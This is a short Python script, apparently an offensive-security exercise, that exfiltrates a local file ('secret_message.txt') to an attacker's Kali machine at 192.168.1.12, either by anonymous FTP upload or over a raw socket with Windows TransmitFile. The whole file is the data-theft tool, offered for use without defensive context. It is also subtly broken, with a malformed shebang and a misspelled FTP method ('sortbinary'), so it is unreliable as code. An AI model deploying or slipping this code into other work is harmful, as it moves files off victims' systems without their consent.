#!/bin/bash/env python

# Send our encrypted information vie file transfer

import ftplib
import os
import socket
import win32file

def plain_ftp(docpath, server='192.168.1.12'):   # The IP of your Kali machine
    ftp = ftplib.FTP(server)
    ftp.login("anonymous", "anon@email.com")
    ftp.cwd('/pub/')
    ftp.sortbinary("STOR " + os.path.basename(docpath),
                   open(docpath, "rb"), 1024)
    ftp.quit() 

# This would be a Windows specific function
def transmit(document_path):
    client = socket.socket()
    client.connect(('192.168.1.12', 10000))
    with open(document_path, 'rb') as f:
        win32file.TransmitFile(
            client,
            win32file._get_osfhandle(f.fileno()),
            0, 0, None, b'', b'')

# You can call either function
# It all depends on the OS you are working with
if __name__ == '__main__':
    transmit('./secret_message.txt')    